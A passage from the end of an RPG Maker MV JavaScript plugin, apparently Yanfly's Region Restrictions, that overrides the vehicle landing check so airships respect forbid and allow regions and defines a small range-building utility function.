  var value = Yanfly.RR.Game_Vehicle_isLandOk.call(this, x, y, d);
  if (!value) return false;
  if (this.isAirship()) {
    d = 5;
    $gamePlayer._through = false;
  }
  if ($gamePlayer.isPlayerRegionForbid(x, y, d)) {
    if (this.isAirship()) $gamePlayer._through = true;
    return false;
  }
  if ($gamePlayer.isPlayerRegionAllow(x, y, d)) {
    if (this.isAirship()) $gamePlayer._through = true;
    return true;
  }
  return true;
};

//=============================================================================
// Utilities
//=============================================================================

Yanfly.Util = Yanfly.Util || {};

Yanfly.Util.getRange = function(n, m) {
    var result = [];
    for (var i = n; i <= m; ++i) result.push(i);
    return result;
};

//=============================================================================
// End of File
//=============================================================================
